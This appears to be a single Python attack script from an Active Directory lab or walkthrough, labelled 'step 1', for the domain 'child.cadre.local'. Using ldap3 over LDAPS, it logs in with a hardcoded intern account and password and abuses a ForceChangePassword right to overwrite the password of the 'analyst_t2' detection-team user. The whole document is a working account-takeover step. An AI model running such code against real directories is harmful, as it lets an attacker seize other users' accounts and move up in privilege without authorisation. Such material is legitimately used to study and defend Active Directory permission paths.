# WT002 step 1 — reset analyst_t2 password as intern_blue via LDAPS (ACE#18 ForceChangePassword)
import ldap3

server = ldap3.Server("ldaps://dc02.child.cadre.local", get_info=ldap3.ALL)
conn = ldap3.Connection(
    server,
    user="child.cadre.local\\intern_blue",
    password="1nt3rn_Blu3!",
    authentication=ldap3.NTLM,
    auto_bind=True,
)
dn = "CN=analyst_t2,OU=Detection,DC=child,DC=cadre,DC=local"
# unicodePwd must be UTF-16LE of a quoted password, and requires LDAPS
new_pass = '"TempPass123!"'
conn.modify(dn, {"unicodePwd": [(ldap3.MODIFY_REPLACE, [new_pass.encode("utf-16-le")])]})
print("PASSWORD_RESET", conn.result["result"] == 0, conn.result.get("message", ""))
conn.unbind()
